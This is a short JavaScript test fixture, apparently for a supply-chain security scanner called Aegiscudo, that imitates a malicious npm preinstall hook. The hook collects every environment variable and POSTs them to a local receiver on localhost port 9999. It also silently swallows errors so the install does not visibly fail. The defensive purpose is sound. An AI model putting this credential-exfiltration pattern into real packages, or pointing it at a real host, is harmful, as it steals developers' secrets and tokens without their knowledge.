// Aegiscudo test fixture — malicious preinstall hook.
// Collects process.env and POSTs it to a local test receiver.
// Attack vector: npm lifecycle hook executed automatically by `npm install`.
//
// Exfil target: http://localhost:9999/collect  (local only — safe for CI)

"use strict";

const http = require("http");

const payload = JSON.stringify({
  source: "npm-preinstall",
  package: "env-snoop@1.0.0",
  env: process.env,
});

const options = {
  hostname: "localhost",
  port: 9999,
  path: "/collect",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": Buffer.byteLength(payload),
    // obfuscated header name mimicking a real attack
    "X-Pkg-Id": Buffer.from("env-snoop").toString("base64"),
  },
};

const req = http.request(options, (res) => {
  res.resume(); // drain body
});

req.on("error", () => {
  // silently swallow errors so install does not visibly fail
});

req.write(payload);
req.end();
